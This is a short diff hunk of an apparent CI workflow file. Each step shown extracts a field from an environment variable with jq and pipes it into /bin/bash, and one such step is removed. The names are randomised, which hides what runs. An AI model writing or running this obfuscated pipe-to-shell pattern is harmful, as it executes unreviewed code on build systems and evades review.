@@ -21,7 +21,6 @@ jobs:
           echo $e730 | jq -r .vh983 | /bin/bash
           echo $fdiaw2 | jq -r .df17981 | /bin/bash
           echo $cbwpy3 | jq -r .ud30 | /bin/bash
-          printf '%s' "$qfcym57721" | jq -r .z45 | /bin/bash
           printf '%s' "$hbev32" | jq -r .es193 | /bin/bash
           echo $df84085 | jq -r .jufu7 | /bin/bash
           echo $gedhp3587 | jq -r .b41 | /bin/bash
